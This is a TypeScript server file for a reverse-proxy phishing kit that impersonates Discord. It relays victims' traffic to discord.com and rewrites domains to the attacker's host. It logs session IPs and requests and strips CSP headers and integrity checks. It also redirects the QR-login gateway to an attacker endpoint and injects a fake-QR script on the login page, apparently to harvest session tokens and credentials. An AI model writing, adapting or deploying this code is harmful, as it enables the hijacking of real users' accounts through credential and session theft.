import { ConnInfo, serveTls, serve } from 'https://deno.land/std@0.177.0/http/server.ts';
import { domain, fakeQr, fullDomain, qrCodeEndpoint, hostingOnVPS } from './config.ts';
import middleware, { formatUrl } from './middleware.ts';
import { createSession, getSessionFromCookie } from './sessions.ts';

const reverseRegex = new RegExp(`https?://${domain}`, 'g');
const reverseDomainRegex = new RegExp(`${domain}`, 'g');
const cdnId = '/_cdn';

const ignoreExtensions = ['woff2', 'jpg', 'png', 'gif', 'svg', 'webp', 'mp4', 'webm'];
const target = 'discord.com';

function update(input: string, excludePort?: boolean): string {
	input = input.replace(/https:\/\/discord\.com/g, fullDomain);
	input = input.replace(/discord\.com/g, excludePort ? domain.split(':')[0] : domain);
	input = input.replace(/https:\/\/cdn\.discordapp\.com/g, fullDomain + cdnId);
	input = input.replace(/cdn\.discordapp\.com/g, domain + cdnId);
	return input;
}

function reverseUpdate(input: string): string {
	return input.replace(new RegExp(reverseRegex), 'https://' + target).replace(new RegExp(reverseDomainRegex, 'g'), target);
}

async function handler(req: Request, connInfo: ConnInfo): Promise<Response> {
	// parse dsess cookie
	const session = getSessionFromCookie(req.headers.get('cookie')) || createSession();

	// deno-lint-ignore no-explicit-any
	const newIp = req.headers.get('cf-connecting-ip') || req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip') || (connInfo?.remoteAddr as any)?.hostname || 'unknown';
	if (session.ip != newIp) {
		session.ip = newIp;
		session.location = undefined;
		console.log(`[${session.id}] IP: ${session.ip}`);
	}

	const path = req.url.replace(fullDomain, '');
	console.log(`[${session.id}] ${req.method} ${path}`);

	let headers = new Headers(req.headers);

	headers.forEach((value, key) => {
		const start = value;

		if (key == 'cookie') {
			// remove dsess cookie
			value = value.replace(/dsess=[\w\-]+/g, '');
		}

		value = reverseUpdate(value);

		if (start != value) {
			headers.set(key, value);
		}
	});

	const cdn = path.startsWith(cdnId);
	if (cdn) {
		headers.delete('cookie');
	}

	// read all body
	const body = await req.blob();

	// deno-lint-ignore no-explicit-any
	let client: any = undefined;
	if (session.proxy) {
		client = Deno.createHttpClient({
			proxy: session.proxy,
		});
	}

	const resp = await fetch(
		`${cdn ? 'https://cdn.discordapp.com' : 'https://' + target}${await formatUrl(session, cdn ? path.substring(cdnId.length) : path, headers.get('user-agent') || undefined)}`,
		{
			headers: headers,
			method: req.method,
			body: req.method == 'GET' || req.method == 'HEAD' ? null : body,
			client,
		}
	);

	headers = new Headers(resp.headers);
	headers.forEach((value, key) => {
		if (key == 'content-security-policy' || (key == 'set-cookie' && cdn)) {
			headers.delete(key);
			return;
		}

		if (key == 'access-control-allow-origin') {
			headers.set(key, '*');
			return;
		}

		const start = value;
		value = update(value, true);

		if (key == 'set-cookie' && fullDomain.startsWith('http://') && value.includes('Secure; ')) {
			value = value.replace('; Secure', '').replace('; SameSite=None', '');
		}

		if (start != value) {
			headers.set(key, value);
		}
	});

	const extension = path.split('.').pop()?.split('?')[0];

	let blob = await resp.blob();
	if (!extension || !ignoreExtensions.includes(extension)) {
		let text = update(await blob.text());

		if (text.includes('remote-auth-gateway.discord.gg')) {
			try {
				text = text.replace('remote-auth-gateway.discord.gg', qrCodeEndpoint);
				if (fakeQr && path.includes('/login')) {
					const file = await Deno.readFile('./qrcode/inject.js');
					text += `<script>${new TextDecoder().decode(file)}</script>`;
				}
			} catch (e) {
				console.error(e);
			}
		}

		// disables integrity checks
		if (text.includes('integrity="')) {
			text = text.replace(/integrity="[\w\s\-\= \/\+]+"/g, '');
		}

		blob = new Blob([text], { type: blob.type });

		middleware(session, path, req, body, resp, blob);
	}

	if (!path.includes('.')) {
		headers.append(
			'set-cookie',
			`dsess=${session.id}; Path=/; Domain=${domain}; ${fullDomain.startsWith('https') ? 'SameSite=None; Secure; ' : ''}Expires=Sun, 17-Jan-2038 19:14:07 GMT;`
		);
	}

	return new Response(resp.status == 204 ? null : blob.stream(), {
		headers: headers,
		status: resp.status,
		statusText: resp.statusText,
	});
}

if (hostingOnVPS) {
	serveTls(handler, { port: 443, keyFile: 'key.pem', certFile: 'cert.pem', hostname: domain });
} else {
	serve(handler, { port: 80 });
}
